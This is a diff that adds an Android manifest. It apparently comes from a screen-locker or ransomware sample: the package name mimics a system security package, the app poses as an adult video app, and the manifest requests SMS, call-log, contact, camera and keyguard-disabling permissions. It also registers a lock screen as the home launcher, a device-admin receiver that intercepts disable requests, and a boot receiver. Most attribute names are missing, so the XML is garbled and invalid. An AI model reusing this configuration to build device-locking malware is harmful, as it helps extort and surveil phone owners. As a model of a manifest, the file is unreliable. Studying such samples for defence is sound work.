@@ -1,0 +1,68 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest android:versionCode="10000" android:="1.0.0" android:="true" package="com.android.security.fdiduds8" platformBuildVersionCode="22" platformBuildVersionName="5.1.1-1819727"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-sdk android:="14" android:="22" />
+    <supports-screens android:="true" android:="true" android:="true" android:="true" android:="true" android:="true" />
+    <uses-feature android:="android.hardware.location.network" android:="false" />
+    <uses-feature android:="android.hardware.telephony" android:="false" />
+    <uses-feature android:="android.hardware.location" android:="false" />
+    <uses-feature android:="android.hardware.location.gps" android:="false" />
+    <uses-feature android:="android.hardware.touchscreen" android:="false" />
+    <uses-feature android:="android.hardware.camera" android:="false" />
+    <uses-feature android:="android.hardware.camera.autofocus" android:="false" />
+    <uses-feature android:="android.hardware.camera.flash" android:="false" />
+    <uses-feature android:="android.hardware.camera.front" android:="false" />
+    <uses-feature android:="android.hardware.microphone" android:="false" />
+    <uses-permission android:="com.google.android.providers.gsf.permission.READ_GSERVICES" />
+    <uses-permission android:="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:="android.permission.GET_TASKS" />
+    <uses-permission android:="android.permission.PACKAGE_USAGE_STATS" />
+    <uses-permission android:="android.permission.INTERNET" />
+    <uses-permission android:="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:="android.permission.READ_CONTACTS" />
+    <uses-permission android:="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:="android.permission.READ_CALL_LOG" />
+    <uses-permission android:="android.permission.READ_SMS" />
+    <uses-permission android:="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:="android.permission.EXPAND_STATUS_BAR" />
+    <uses-permission android:="android.permission.CAMERA" />
+    <uses-permission android:="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:="android.permission.WAKE_LOCK" />
+    <application android:="XXXHDVideos" android:="@drawable/l" android:="false" android:="true">
+        <activity android:="@style/Theme.Transparent" android:=".MainActivity" android:="true" android:="singleTask" android:="keyboardHidden|orientation" android:="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity android:="@style/Theme.Transparent" android:=".LockActivity" android:="false" android:=".LockActivity" android:="true" android:="singleTask" android:="keyboard|keyboardHidden|locale|orientation|screenSize" android:="stateAlwaysHidden" android:="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.HOME" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+        <service android:=".MainService" android:="false" android:="false">
+            <intent-filter>
+                <action android:name="android.view.InputMethod" />
+            </intent-filter>
+        </service>
+        <receiver android:=".MainReceiver" android:="android.permission.RECEIVE_BOOT_COMPLETED" android:="true" android:="false">
+            <intent-filter android:="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        <receiver android:="@string/device_admin_label" android:=".DeviceAdmin" android:="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:="android.app.device_admin" android:="@xml/security_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
